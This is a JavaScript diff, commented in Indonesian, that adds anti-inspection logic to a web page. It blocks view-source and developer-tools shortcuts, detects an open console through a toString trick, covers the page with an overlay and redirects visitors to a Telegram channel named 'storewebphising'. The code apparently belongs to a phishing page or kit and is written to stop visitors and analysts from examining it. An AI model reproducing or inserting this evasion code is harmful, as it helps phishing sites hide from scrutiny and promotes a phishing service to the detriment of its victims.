@@ -21,11 +21,45 @@
         }
     });
 
-    // Menambahkan pesan saat Developer Tools dibuka
+    // Menambahkan overlay untuk menonaktifkan interaksi
+    function disableInteraction() {
+        var overlay = document.createElement("div");
+        overlay.style.position = "fixed";
+        overlay.style.top = "0";
+        overlay.style.left = "0";
+        overlay.style.width = "100%";
+        overlay.style.height = "100%";
+        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.9)";
+        overlay.style.zIndex = "9999";
+        overlay.style.pointerEvents = "auto";  // Menonaktifkan interaksi dengan elemen
+        document.body.appendChild(overlay);
+    }
+
+    // Mendeteksi jika user menekan Ctrl + U atau membuka developer tools
+    window.addEventListener('keydown', function(event) {
+        // Deteksi jika pengguna menekan 'Ctrl + U'
+        if (event.ctrlKey && (event.key === 'u' || event.key === 'U')) {
+            event.preventDefault();  // Mencegah membuka view-source
+            window.location.href = 'https://t.me/storewebphising';  // Arahkan ke URL
+        }
+
+        // Deteksi jika pengguna menekan 'Ctrl + Shift + I' (Developer Tools)
+        if (event.ctrlKey && event.shiftKey && event.key === 'I') {
+            event.preventDefault();  // Mencegah membuka developer tools
+            window.location.href = 'https://t.me/storewebphising';  // Arahkan ke URL
+        }
+    });
+
+    // Deteksi ketika Developer Tools dibuka
     var devtools = /./;
     devtools.toString = function() {
-        console.log(asciiArt);  // Menampilkan ASCII art di konsol
-        window.location.href = 'https://t.me/storewebphising';  // Mengarahkan ke URL
+        // Menampilkan ASCII art di konsol
+        console.log(asciiArt);
+        // Menambahkan overlay untuk menonaktifkan interaksi dengan halaman
+        disableInteraction();
+        // Mengarahkan ke halaman
+        window.location.href = 'https://t.me/storewebphising';
     };
-    console.log(devtools);  // Memicu untuk membuka devtools
+
+    console.log(devtools);  // Memicu pengalihan jika Developer Tools dibuka
 })();
